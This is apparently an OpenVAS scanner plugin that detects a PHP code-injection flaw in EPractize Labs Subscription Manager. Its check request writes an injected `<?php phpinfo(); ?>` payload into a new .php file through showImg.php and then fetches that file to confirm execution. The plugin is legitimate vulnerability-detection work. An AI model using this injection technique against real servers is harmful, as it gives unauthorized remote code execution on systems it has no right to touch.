###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_EPractize_Subscription_Manager_50919.nasl 3062 2016-04-14 11:03:39Z benallard $
#
# EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "EPractize Labs Subscription Manager is prone to a remote PHP code-
injection vulnerability.

An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.";


if (description)
{
 script_id(103401);
 script_bugtraq_id(50919);
 script_version ("$Revision: 3062 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50919");
 script_xref(name : "URL" , value : "http://www.epractizelabs.com/email-marketing/subscription-manager.html");
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/current/0118.html");

 script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-01-26 12:49:25 +0100 (Thu, 26 Jan 2012)");
 script_summary("Determine if EPractize Labs Subscription Manager is prone to a remote PHP code injection vulnerability");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/Subscribe","/subscribe",cgi_dirs());
file = "openvas-" + rand() + ".php";

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"<title> Mailing List",extra_check:"eplform")) {
    
    url = string(dir,"/showImg.php?db=",file,"&email=%3C?php%20phpinfo();%20?%3E");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(buf =~ "HTTP/1.. 200 OK") {

      url = string(dir,"/",file);

      if(http_vuln_check(port:port, url:url,pattern:"<title>phpinfo\(\)")) {

        security_message(port:port);
        exit(0);

      }

    }

  }
}

exit(0);
